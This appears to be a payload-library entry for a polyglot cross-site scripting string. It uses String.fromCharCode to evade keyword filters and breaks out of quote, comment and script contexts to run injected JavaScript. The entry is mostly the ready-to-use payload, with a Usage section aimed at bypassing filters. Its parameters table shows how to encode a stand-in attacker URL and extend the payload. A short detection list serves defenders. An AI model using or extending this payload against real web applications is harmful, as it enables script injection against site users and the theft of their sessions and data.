---
id: a1ad5aef-9786-4697-bba5-6d7837452704
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.286121+00:00'
updated_at: '2023-04-10T20:21:55.867714+00:00'
tags:
  - xss
  - polyglot
  - fromCharCode
platforms:
  - Web
validated: true
---

# String-fromCharCode-Polyglot-XSS

## Code

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

## Description

Polyglot using String.fromCharCode to spell 'XSS' without direct strings, closing tags variably for injection into SQL, JS, HTML contexts.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| fromCharCode(88,83,83) | Encodes 'XSS'; extend for full payloads | fromCharCode(104,116,116,112,58,47,47,97,116,116,97,99,107,101,114,46,99,111,109) |

## Usage

Inject into script blocks or attributes where direct 'alert' is filtered; triggers in multiple environments.

## Detection

- fromCharCode usage in JS.
- Unusual tag closers like --> </SCRIPT>.

## Related

- [[procedures/Polyglot-XSS-Attack-using-SVG-Image-Injection]]
